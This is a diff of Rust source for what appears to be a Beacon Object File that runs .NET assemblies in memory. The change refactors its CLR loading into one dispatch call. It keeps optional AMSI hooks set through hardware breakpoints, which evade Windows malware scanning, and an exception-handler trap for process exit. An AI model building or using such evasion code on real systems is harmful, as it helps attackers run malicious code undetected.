@@ -7,6 +7,10 @@ pub mod cleanup;
 #[cfg(target_os = "windows")]
 pub mod clr;
 #[cfg(target_os = "windows")]
+pub mod clr_netfx;
+#[cfg(target_os = "windows")]
+pub mod clr_core;
+#[cfg(target_os = "windows")]
 pub mod error;
 #[cfg(target_os = "windows")]
 pub mod io;
@@ -62,12 +66,9 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             None
         };
 
-        let host = clr::start(&asm_info)?;
-        rustbof::eprintln!("[dbg] clr started");
         let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
         rustbof::eprintln!("[dbg] io channel open");
-        let domain = clr::create_domain(&host, &a.app_domain)?;
-        rustbof::eprintln!("[dbg] appdomain created");
+
         let _amsi = if a.amsi {
             rustbof::eprintln!("[dbg] installing amsi hooks");
             Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
@@ -75,19 +76,9 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             None
         };
 
-        let assembly = clr::load_assembly(&domain, &a.asm_bytes)?;
-        rustbof::eprintln!("[dbg] assembly loaded");
-
-        // save_cleanup_point acts like setjmp: the exit-trap VEH redirects back here
-        // if the assembly calls Environment.Exit / RtlExitUserProcess.
-        // `invoked` lives in run()'s stack frame (intact through the VEH redirect), so
-        // on re-entry it is already true — we skip the invoke block and fall through
-        // to normal RAII cleanup.
+        // save_cleanup_point acts like setjmp: exit-trap VEH redirects back here.
         let mut invoked = false;
         let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
-        // The VEH exit-trap re-enters at save_cleanup_point which returns here a second time.
-        // At that point `invoked == true` (set below), so we skip this block and fall through
-        // to normal RAII cleanup. `let _ = invoked` below makes the compiler see the read.
         if !invoked {
             invoked = true;
 
@@ -102,16 +93,19 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             let _exit_trap = engine
                 .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                 .map_err(BofError::Hwbp)?;
-            rustbof::eprintln!("[dbg] exit-trap installed, invoking...");
+            rustbof::eprintln!("[dbg] exit-trap installed, dispatching...");
 
-            clr::invoke(&assembly, &a.asm_args, a.entry_point)?;
-            rustbof::eprintln!("[dbg] invoke returned");
+            clr::dispatch(
+                &asm_info, &a.asm_bytes,
+                &a.app_domain, &a.asm_args, a.entry_point,
+            )?;
+            rustbof::eprintln!("[dbg] dispatch returned");
             let output = io_ch.drain()?;
             rustbof::eprintln!("\n{}", output);
         } else {
             rustbof::eprintln!("[dbg] exit-trap fired, skipping to cleanup");
         }
-        let _ = invoked; // make compiler see the VEH re-entry read of `invoked`
+        let _ = invoked;
     }
     Ok(())
 }
